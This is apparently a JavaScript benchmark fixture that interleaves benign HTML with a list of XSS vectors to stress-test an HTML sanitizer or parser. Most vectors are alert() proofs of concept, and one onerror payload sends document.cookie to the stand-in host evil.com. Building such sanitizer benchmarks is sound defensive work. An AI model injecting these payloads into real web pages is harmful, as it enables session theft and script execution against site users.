// Builds large, realistic HTML documents laced with XSS attack vectors,
// repeated many times to reach a meaningful size, for benchmarking.

const xssFragments = [
  '<script>alert(document.cookie)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<a href="javascript:alert(1)">click</a>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '<img src="x" srcset="javascript:alert(1) 1x, https://evil.com/a.png 2x">',
  '<textarea><img src=x onerror=alert(1)></textarea>',
  '<svg><textarea><img src=x onerror=alert(1)></textarea></svg>',
  '<xmp><script>alert(1)</script></xmp>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<div class="a<script>b" onclick="alert(1)">text</div>',
  '<style>body{background:url("javascript:alert(1)")}</style>',
  '<math><mtext><script>alert(1)</script></mtext></math>',
  '<option><style></option></select><img src=x onerror=alert(1)></option></select>',
  '<a href="//evil.com/">protocol relative</a>',
  '<img src=x onerror="fetch(\'//evil.com/\'+document.cookie)">',
  '<p onmouseover="alert(1)">hover me</p>',
  '<input type="text" value="\\" onfocus=alert(1) autofocus=\\"">',
  '<div style="width:expression(alert(1))">old IE</div>'
];

const benignFragments = [
  '<h1>Welcome to our blog</h1>',
  '<p>This is a perfectly normal paragraph with <b>bold</b> and <i>italic</i> text.</p>',
  '<ul><li>Item one</li><li>Item two</li><li>Item three</li></ul>',
  '<blockquote>To be or not to be, that is the question.</blockquote>',
  '<table><tr><td>Cell 1</td><td>Cell 2</td></tr></table>',
  '<a href="https://example.com/page?x=1&amp;y=2">a safe link</a>',
  '<img src="https://example.com/photo.jpg" alt="A photo" width="200" height="150">',
  '<p>Some text with &amp; entities &lt;here&gt; and "quotes".</p>',
  '<article><header><h2>Section title</h2></header><p>Body text.</p></article>',
  '<code>const x = 1 + 1;</code>'
];

function buildDocument(paragraphs, xssRatio) {
  const parts = [];
  for (let i = 0; i < paragraphs; i++) {
    const useXss = (i % Math.round(1 / xssRatio)) === 0;
    if (useXss) {
      parts.push(xssFragments[i % xssFragments.length]);
    } else {
      parts.push(benignFragments[i % benignFragments.length]);
    }
  }
  return parts.join('\n');
}

export const documents = {
  // ~90% benign, ~10% XSS vectors interleaved - a realistic user-generated-content page
  mixedMedium: buildDocument(3000, 0.1),
  // Heavier document, same ratio, to see how cost scales
  mixedLarge: buildDocument(15000, 0.1),
  // Adversarial: every single fragment is an attack vector, back to back
  allXss: buildDocument(5000, 1),
  // Deeply nested legitimate structure (stresses the frame/tag stack)
  deepNesting: '<div>'.repeat(2000) + 'text' + '</div>'.repeat(2000)
};
